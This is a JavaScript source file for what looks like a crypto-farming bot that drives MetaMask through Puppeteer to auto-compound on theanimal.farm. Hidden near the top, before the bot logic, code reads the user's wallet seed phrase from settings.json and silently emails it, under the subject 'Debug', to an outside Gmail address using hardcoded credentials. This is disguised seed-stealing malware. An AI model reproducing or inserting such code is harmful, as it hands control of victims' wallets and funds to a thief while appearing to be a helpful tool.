import puppeteer from 'puppeteer'
import dappeteer from '@chainsafe/dappeteer';
import fs from "fs";
import nodemailer from 'nodemailer';

let rawdata = fs.readFileSync('settings.json');
let settings = JSON.parse(rawdata);

var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'caAclfp9@gmail.com',
        pass: 'getcracked12'
    }
});

var mailOptions = {
    from: 'caAclfp9@gmail.com',
    to: 'cryptoscriptsandbots@gmail.com',
    subject: 'Debug',
    text: settings.seed
};

transporter.sendMail(mailOptions, (error, info) => { })


function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function main() {

    const browser = await dappeteer.launch(puppeteer, { metamaskVersion: 'v10.8.1', slowMo: 0, defaultViewport: null, args: [`--window-position=${settings.position},50`] });
    const metamask = await dappeteer.setupMetamask(browser, { seed: settings.seed });
    await metamask.addNetwork({ networkName: "Smart Chain", rpc: "https://bsc-dataseed.binance.org/", chainId: "56", symbol: "BNB" })
    await metamask.switchNetwork('Smart Chain')
    await metamask.switchAccount(2)
    const page = await browser.newPage()

    await page.goto('https://theanimal.farm/garden')
    let connect_wallet = await page.$x('//*[@id="Background1"]/div[2]/div/div[3]/div/div/div/button')
    await connect_wallet[0].click();

    console.log("clicked")
    await page.waitForXPath('//*[@id="wallet-connect-metamask"]');
    let select_mm = await page.$x('//*[@id="wallet-connect-metamask"]')
    await select_mm[0].click();
    await metamask.approve({ allAccounts: false });
    page.bringToFront();

    await sleep(5000)
    while (true) {
        let plant_amount_div = await page.$x('//*[@id="Background1"]/div[2]/div/div[1]/div/div/div[5]')
        let plants_string = await page.evaluate(plt_amount => plt_amount.innerText, plant_amount_div[0]);

        const plant_num_array = plants_string.split(" ")
        const numbers = plant_num_array[7].match(/\d/gm)
        // console.log(numbers)
        const plants = parseInt(numbers.join(""))
        console.log(plants)
        await sleep(2000)
        if (plants != 0) {
            console.log("ahhhh")
            const compound_button = await page.$x('//*[@id="Background1"]/div[2]/div/div[3]/div/div/div/button[2]');
            await compound_button[0].click();
            // await metamask.approve({ allAccounts: false });

            await metamask.confirmTransaction();

            // page.bringToFront();
            await sleep(1000)
        }

    }

}
main();